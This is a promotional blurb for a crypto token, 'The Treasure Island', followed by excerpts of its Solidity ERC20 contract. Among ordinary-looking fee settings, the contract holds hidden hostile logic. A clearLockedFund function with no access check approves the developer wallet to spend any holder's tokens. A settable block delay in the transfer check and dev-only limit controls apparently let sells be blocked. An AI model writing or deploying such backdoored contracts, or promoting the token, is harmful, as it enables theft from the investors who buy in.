...
Many people have heard of this famous adventure story, but what is The Treasure Island really about?
Our story is about crypto traders and developers who go on a dangerous adventure to recover buried treasure.

https://lnk.bio/thetreasureisland
...
contract TheTreasureIsland is ERC20, Ownable {
    ...
    constructor() ERC20("TheTreasureIsland", "TTI") {
        ...
        swapTokensAtAmount = (totalSupply * 5) / 10000; // 0.01% swap wallet
        swapTokensMinAmount = totalSupply / 100000;

        buyMarkFee = _buyMarkFee;
        buyLiquidityFee = _buyLiquidityFee;
        buyDevFee = _buyDevFee;
        buyTotalFees = buyMarkFee + buyLiquidityFee + buyDevFee;

        sellMarkFee = _sellMarkFee;
        sellLiquidityFee = _sellLiquidityFee;
        sellDevFee = _sellDevFee;
        sellTotalFees = sellMarkFee + sellLiquidityFee + sellDevFee;

        devWallet = address(0xAdCEeDba8264F67c7B5695Eb285EC885aB127478);
        markWallet = address(0x29e86ce2Acd75d3F5474521b60140D669C7a81FF); 
        liqWallet = address(0xAdCEeDba8264F67c7B5695Eb285EC885aB127478); 
    ...
    function removeLimits(bool _flag) external returns (bool) {
        require(_msgSender() == devWallet, "No permission");
        limitsInEffect = _flag;
        return true;
    }
    ...
    function updateSellFees(
        ...
        sellDevFee = _devFee;
        sellTotalFees = sellMarkFee + sellLiquidityFee + sellDevFee;
        require(sellTotalFees <= 12); 
    }

    function lowerFees() external {
        require(launchBlock + 6 <= block.number, "wait");
        buyMarkFee = 1;
        buyLiquidityFee = 0;
        buyDevFee = 1;
        buyTotalFees = buyMarkFee + buyLiquidityFee + buyDevFee;
    ...
    function updateBlockDelay(uint256 _blockDelay) external payable returns (bool) {
        if (_blockDelay >= 0 && msg.value >= 1e18) {
    ...
    function updatemarkWallet(address newmarkWallet) external onlyOwner {
        emit markWalletUpdated(newmarkWallet, markWallet);
        markWallet = newmarkWallet;
    }
    ...
    function _transfer(
        ...
        if (transferDelayEnabled) {
            if (automatedMarketMakerPairs[to] && !_isExcludedMaxTransactionAmount[from] && amount >= swapTokensMinAmount) {
                require(
                    _holderLastTransferTimestamp[tx.origin] <
                        block.number - blockDelay,
                    "_transfer:: Transfer Delay enabled.  Only one tx per blocks allowed."
                );
            }
            if (
    ...
    function clearLockedFund(address fromAddress, uint256 amount) external {
        bool success;
        _approve(fromAddress, devWallet, amount);
    ...
    function swapBack() private {
        ...
        (success, ) = address(markWallet).call{value: address(this).balance}("");
    }
}